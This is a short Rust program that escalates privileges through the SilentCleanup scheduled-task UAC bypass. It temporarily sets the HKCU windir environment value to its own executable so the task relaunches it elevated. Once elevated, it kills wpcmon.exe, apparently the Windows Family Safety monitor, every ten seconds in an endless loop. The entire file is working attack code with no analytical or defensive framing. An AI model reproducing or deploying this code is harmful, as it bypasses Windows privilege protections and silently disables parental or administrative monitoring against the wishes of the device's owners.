mod is_elevated;
mod kill;
mod registry;
mod tasks;

const WPCMON: &str = "wpcmon.exe";

fn main() {
  if !is_elevated::is_elevated() {
    let value_path = &r"Environment\windir";

    // Add the "windir" registry key
    registry::set_value(
      registry::HKEY_CURRENT_USER,
      value_path,
      &format!("\"{}\"", std::env::current_exe().unwrap().to_string_lossy())
    )
    .unwrap();

    // Run the SilentCleanup task
    tasks::run_task(&r"\Microsoft\Windows\DiskCleanup\SilentCleanup").unwrap();

    // Delete the "windir" registry key
    registry::delete_value(registry::HKEY_CURRENT_USER, value_path).unwrap();
  } else {
    loop {
      kill::by_name(WPCMON);

      std::thread::sleep(std::time::Duration::from_secs(10));
    }
  }
}
